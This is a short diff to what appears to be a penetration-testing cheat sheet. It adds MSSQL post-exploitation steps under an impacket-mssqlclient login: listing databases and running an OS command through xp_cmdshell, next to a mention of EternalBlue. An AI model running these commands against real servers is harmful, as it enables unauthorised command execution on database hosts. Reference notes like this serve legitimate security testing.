@@ -36,6 +36,8 @@ MS17-010 EternalBlue exploitation for SMBv1 in Windows Vista, 7, 8.1, 10; Server
 ```
 impacket-mssqlclient [DOMAIN]/[USERNAME]@[IP_ADDR] -windows-auth
 SELECT IS_SRVROLEMEMBER('sysadmin')
+SELECT name FROM master.dbo.sysdatabases
+EXEC master..xp_cmdshell '[CMD]'
 ```
 
 ### MySQL (3306)
